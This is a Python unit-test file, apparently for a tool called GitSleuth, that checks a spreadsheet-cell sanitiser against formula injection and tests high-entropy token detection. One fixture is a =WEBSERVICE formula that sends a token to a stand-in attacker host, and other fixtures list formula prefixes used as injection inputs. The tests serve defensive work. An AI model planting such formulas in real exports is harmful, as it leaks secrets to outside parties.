import unittest

from GitSleuth import find_high_entropy_snippets, sanitize_spreadsheet_cell


class SpreadsheetSanitizationTests(unittest.TestCase):
    def test_formula_leading_entropy_snippet_is_neutralized(self):
        token = "AbCdEfGhIjKlMnOpQrStUvWxYz1234567890"
        formula = f'=WEBSERVICE("https://attacker.example/?x={token}")'

        self.assertEqual(find_high_entropy_snippets(formula), [formula])
        self.assertEqual(sanitize_spreadsheet_cell(formula), "'" + formula)

    def test_common_formula_prefixes_are_neutralized(self):
        for value in ("=cmd", "+cmd", "-cmd", "@cmd", "\t=cmd", "\r=cmd"):
            with self.subTest(value=value):
                self.assertEqual(sanitize_spreadsheet_cell(value), "'" + value)

    def test_non_formula_values_are_unchanged(self):
        self.assertEqual(sanitize_spreadsheet_cell("plain text"), "plain text")
        self.assertEqual(sanitize_spreadsheet_cell(12.3), 12.3)


if __name__ == "__main__":
    unittest.main()
